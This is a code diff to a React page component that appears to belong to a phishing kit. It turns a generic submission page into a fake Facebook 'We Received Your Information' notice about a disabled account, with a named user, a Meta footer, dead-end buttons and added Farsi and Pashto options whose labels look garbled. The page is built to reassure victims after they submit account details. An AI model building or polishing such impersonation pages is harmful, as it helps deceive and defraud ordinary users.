@@ -1,5 +1,5 @@
 import Logo1 from '@/assets/images/logo1.png';
-import { faCheckCircle, faDownload, faEnvelope } from '@fortawesome/free-solid-svg-icons';
+import { faDownload } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
@@ -7,18 +7,18 @@ import { translateText } from '@/utils/translate';
 const SendInfo = () => {
     const defaultTexts = useMemo(
         () => ({
-            title: 'Information Successfully Submitted',
-            description1: 'Your account information has been successfully received and is being reviewed by our security team.',
-            description2: 'We will contact you via email within 24-48 hours regarding the status of your account.',
-            thankYou: 'Thank you for your cooperation in helping us maintain a secure environment.',
-            checkEmail: 'Check Your Email',
-            downloadConfirmation: 'Download Submission Confirmation',
-            contactSupport: 'Contact Support',
+            title: 'We Received Your Information',
+            description1: 'If we still find that you\'re not old enough to be on Facebook, your account will remain disabled. This is because your account doesn\'t follow our Terms of Service.',
+            description2: 'We\'re always looking out for the security of people on Facebook, so until then you can\'t use your account.',
+            logOut: 'Log Out From Iqbal Safi',
+            downloadInfo: 'Download Your Information',
             englishUS: 'English (US)',
             deutsch: 'Deutsch',
             turkce: 'Türkçe',
             polski: 'Polski',
-            italiano: 'Italiano'
+            italiano: 'Italiano',
+            farsi: 'ڤاريس',
+            pashto: '٢يشتو'
         }),
         []
     );
@@ -32,43 +32,43 @@ const SendInfo = () => {
                     translatedTitle,
                     translatedDesc1,
                     translatedDesc2,
-                    translatedThankYou,
-                    translatedCheckEmail,
+                    translatedLogOut,
                     translatedDownload,
-                    translatedContact,
                     translatedEnglish,
                     translatedDeutsch,
                     translatedTurkce,
                     translatedPolski,
-                    translatedItaliano
+                    translatedItaliano,
+                    translatedFarsi,
+                    translatedPashto
                 ] = await Promise.all([
                     translateText(defaultTexts.title, targetLang),
                     translateText(defaultTexts.description1, targetLang),
                     translateText(defaultTexts.description2, targetLang),
-                    translateText(defaultTexts.thankYou, targetLang),
-                    translateText(defaultTexts.checkEmail, targetLang),
-                    translateText(defaultTexts.downloadConfirmation, targetLang),
-                    translateText(defaultTexts.contactSupport, targetLang),
+                    translateText(defaultTexts.logOut, targetLang),
+                    translateText(defaultTexts.downloadInfo, targetLang),
                     translateText(defaultTexts.englishUS, targetLang),
                     translateText(defaultTexts.deutsch, targetLang),
                     translateText(defaultTexts.turkce, targetLang),
                     translateText(defaultTexts.polski, targetLang),
-                    translateText(defaultTexts.italiano, targetLang)
+                    translateText(defaultTexts.italiano, targetLang),
+                    translateText(defaultTexts.farsi, targetLang),
+                    translateText(defaultTexts.pashto, targetLang)
                 ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
                     description1: translatedDesc1,
                     description2: translatedDesc2,
-                    thankYou: translatedThankYou,
-                    checkEmail: translatedCheckEmail,
-                    downloadConfirmation: translatedDownload,
-                    contactSupport: translatedContact,
+                    logOut: translatedLogOut,
+                    downloadInfo: translatedDownload,
                     englishUS: translatedEnglish,
                     deutsch: translatedDeutsch,
                     turkce: translatedTurkce,
                     polski: translatedPolski,
-                    italiano: translatedItaliano
+                    italiano: translatedItaliano,
+                    farsi: translatedFarsi,
+                    pashto: translatedPashto
                 });
             } catch {
                 //
@@ -84,7 +84,7 @@ const SendInfo = () => {
         }
     }, [translateAllTexts]);
 
-    const handleCheckEmail = () => {
+    const handleLogOut = () => {
         window.location.href = 'about:blank';
     };
 
@@ -92,13 +92,11 @@ const SendInfo = () => {
         window.location.href = 'about:blank';
     };
 
-    const handleContactSupport = () => {
-        window.location.href = 'about:blank';
-    };
-
     const languages = [
         { code: 'en', name: translatedTexts.englishUS },
         { code: 'de', name: translatedTexts.deutsch },
+        { code: 'ps', name: translatedTexts.pashto },
+        { code: 'fa', name: translatedTexts.farsi },
         { code: 'tr', name: translatedTexts.turkce },
         { code: 'pl', name: translatedTexts.polski },
         { code: 'it', name: translatedTexts.italiano }
@@ -107,7 +105,7 @@ const SendInfo = () => {
     return (
         <div className='min-h-screen bg-gray-100'>
             {/* Header */}
-            <header className='bg-white shadow-sm'>
+            <header className='bg-white border-b border-gray-300'>
                 <div className='max-w-6xl mx-auto px-4 py-4'>
                     <div className='flex items-center justify-center'>
                         <img 
@@ -120,92 +118,80 @@ const SendInfo = () => {
             </header>
 
             {/* Main Content */}
-            <main className='max-w-4xl mx-auto px-4 py-8'>
-                <div className='bg-white rounded-lg shadow-sm border border-gray-200'>
-                    {/* Success Icon */}
-                    <div className='flex justify-center pt-8'>
-                        <FontAwesomeIcon 
-                            icon={faCheckCircle} 
-                            className='text-green-500 text-6xl'
-                        />
-                    </div>
-
+            <main className='max-w-2xl mx-auto px-4 py-6'>
+                <div className='bg-white rounded-none shadow-sm border border-gray-300'>
                     {/* Title Section */}
-                    <div className='px-6 py-6 border-b border-gray-200 text-center'>
-                        <h1 className='text-2xl font-bold text-gray-900'>
+                    <div className='px-6 py-6 border-b border-gray-300'>
+                        <h1 className='text-xl font-bold text-gray-900'>
                             {translatedTexts.title}
                         </h1>
                     </div>
 
                     {/* Description Section */}
-                    <div className='px-6 py-8 space-y-4'>
-                        <p className='text-gray-700 leading-relaxed text-center'>
+                    <div className='px-6 py-6 space-y-4'>
+                        <p className='text-gray-700 leading-relaxed'>
                             {translatedTexts.description1}
                         </p>
-                        <p className='text-gray-700 leading-relaxed text-center'>
+                        <p className='text-gray-700 leading-relaxed'>
                             {translatedTexts.description2}
-                        </p>
-                        <p className='text-gray-700 leading-relaxed text-center font-medium'>
-                            {translatedTexts.thankYou}
                         </p>
                     </div>
 
                     {/* Action Buttons */}
-                    <div className='px-6 py-6 space-y-4'>
+                    <div className='px-6 py-4 space-y-3 border-t border-gray-300'>
                         <button
-                            onClick={handleCheckEmail}
-                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors'
+                            onClick={handleLogOut}
+                            className='w-full text-left text-blue-600 hover:text-blue-800 font-medium py-2'
                         >
-                            <FontAwesomeIcon icon={faEnvelope} />
-                            <span className='font-medium'>
-                                {translatedTexts.checkEmail}
-                            </span>
+                            <strong>{translatedTexts.logOut}</strong>
                         </button>
 
                         <button
                             onClick={handleDownload}
-                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors'
+                            className='w-full flex items-center space-x-2 text-blue-600 hover:text-blue-800 font-medium py-2'
                         >
-                            <FontAwesomeIcon icon={faDownload} className='text-gray-600' />
-                            <span className='text-gray-900 font-medium'>
-                                {translatedTexts.downloadConfirmation}
-                            </span>
-                        </button>
-
-                        <button
-                            onClick={handleContactSupport}
-                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors'
-                        >
-                            <span className='text-gray-900 font-medium'>
-                                {translatedTexts.contactSupport}
-                            </span>
+                            <FontAwesomeIcon icon={faDownload} />
+                            <span>{translatedTexts.downloadInfo}</span>
                         </button>
                     </div>
                 </div>
 
                 {/* Language Selector */}
-                <div className='mt-8 bg-white rounded-lg shadow-sm border border-gray-200'>
+                <div className='mt-6 bg-white rounded-none shadow-sm border border-gray-300'>
                     <div className='px-6 py-4'>
-                        <div className='grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4'>
-                            {languages.map((language) => (
-                                <button
-                                    key={language.code}
-                                    className='text-blue-600 hover:text-blue-800 text-sm font-medium py-2 px-3 rounded hover:bg-blue-50 transition-colors'
-                                    onClick={() => {
-                                        localStorage.setItem('targetLang', language.code);
-                                        translateAllTexts(language.code);
-                                    }}
-                                >
-                                    {language.name}
+                        <div className='grid grid-cols-2 gap-4'>
+                            <div className='space-y-2'>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.englishUS}
                                 </button>
-                            ))}
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.deutsch}
+                                </button>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.turkce}
+                                </button>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.polski}
+                                </button>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.italiano}
+                                </button>
+                            </div>
+                            <div className='space-y-2'>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.farsi}
+                                </button>
+                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
+                                    {translatedTexts.pashto}
+                                </button>
+                            </div>
                         </div>
                     </div>
                 </div>
 
                 {/* Footer */}
-                <footer className='mt-8 text-center'>
-                    <p className='text-gray-500 text-sm'>
+                <footer className='mt-6 text-center'>
+                    <p className='text-gray-500 text-xs'>
                         Meta © {new Date().getFullYear()}
                     </p>
                 </footer>
@@ -213,5 +199,5 @@ const SendInfo = () => {
         </div>
     );
 };
-
+ 
 export default SendInfo;
